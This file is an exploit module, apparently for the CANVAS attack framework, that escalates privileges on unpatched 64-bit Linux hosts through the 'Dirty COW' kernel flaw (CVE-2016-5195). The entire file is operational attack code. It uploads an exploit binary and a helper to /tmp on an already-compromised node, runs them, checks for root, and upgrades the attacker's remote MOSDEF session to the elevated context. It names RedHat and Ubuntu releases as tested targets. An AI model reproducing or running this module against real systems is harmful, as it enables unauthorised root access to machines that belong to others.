#!/usr/bin/env python

import sys
import time

from exploitutils import *
from canvaserror import *

from ExploitTypes.linuxLocalExploit import LinuxLocalExploit
from osxNode import osxNode

if '.' not in sys.path:
    sys.path.append('.')

NAME                           = 'Linux Kernel FOLL_WRITE gup COW local privilege escalation'
DESCRIPTION                    = 'Elevate MOSDEF Node privileges'
DOCUMENTATION                  = {}
DOCUMENTATION['VENDOR']        = 'Linux'
DOCUMENTATION['Repeatability'] = 'Multiple Times'
DOCUMENTATION['CVE Name']      = 'CVE-2016-5195'
DOCUMENTATION['CVE Url']       = 'https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2016-5195'

VERSION                        = '1.0'
PROPERTY                       = {}
PROPERTY['TYPE']               = 'Exploit'
PROPERTY['SITE']               = 'Local'
PROPERTY['ARCH']               = [ ['Linux', 'x64'] ]

DOCUMENTATION['Notes']         = """

Tested on:
- RedHat 7
- Ubuntu 14
- Ubuntu 16

"""

class theexploit(LinuxLocalExploit):
    def __init__(self):
        LinuxLocalExploit.__init__(self)
        self.name           = NAME
        self.node           = None
        self.local_res      = os.path.join(os.path.dirname(__file__), 'Resources')
        self.local_exp      = os.path.join(self.local_res, 'x_64')
        self.remote_exp     = '/tmp/x'
        self.remote_helper  = '/tmp/h'

    def run(self):
        for node in self.argsDict['passednodes']:
            self.node = node
            self.summary[node] = 0
            self.setInfo("%s (in progress on node %s)" % (self.name, self.node))

            if self.node.shell is None:
                logging.critical("Node has no shell server available")
                logging.critical("Bailing")
                self.setInfo("%s Bailing (Node has no shell server available)" % (self.name))
                continue

            if not self.is_linux_node():
                continue
            if not self.is_64bit_node():
                continue

            if self.compromised(self.remote_helper, 0):
                logging.warning('Already compromised')
                logging.info('Initing elevated MOSDEF loop')

                self.fork_and_exec(self.remote_helper, wait = 1)
                # This is required to setup the remote resolver on 64 bits
                # platforms
                self.init_mosdef_upgrade()

                logging.info('Done')
                self.setInfo("%s Done (Success)" % (self.name))
                self.setProgress(100)
                self.summary[node] = 1
                continue

            logging.info('Uploading helper and exploit')
            if self.nodeUpload(self.local_exp, self.remote_exp) == False:
                self.setInfo("%s Done (Failed to upload exploit)" % (self.name))
                continue
            self.setProgress(30)
            self.add_file_for_cleanup(self.remote_exp)

            if self.nodeUpload(self.local_helper_64, self.remote_helper) == False:
                self.setInfo("%s Done (Failed to upload helper)" % (self.name))
                continue
            self.setProgress(60)
            self.add_file_for_cleanup(self.remote_helper)

            logging.info('Executing exploit')
            self.fork_and_exec(self.remote_exp)
            logging.info('Waiting...')

            self.setProgress(90)

            # wait 5 secs for the exploit to complete
            wait_secs = 5
            if self.compromised(self.remote_helper, wait_secs):
                logging.warning('Compromised!')
                logging.info('Upgrading MOSDEF connection loop')

                self.fork_and_exec(self.remote_helper, wait = 1)
                # This is required to setup the remote resolver on 64 bits
                # platforms
                self.init_mosdef_upgrade()

                logging.info('Done')
                self.setInfo("%s Done (Success)" % (self.name))
                self.summary[node] = 1
            else:
                logging.error('Looks like we failed, try again!')
                self.setInfo("%s Done (Failed)" % (self.name))
                self.setProgress(-1)
                return 0

        return 1


if __name__ == '__main__':
    logging.info("Running CANVAS %s Exploit v%s" % (DESCRIPTION, VERSION))
    app = theexploit()
    ret = standard_callback_commandline(app)
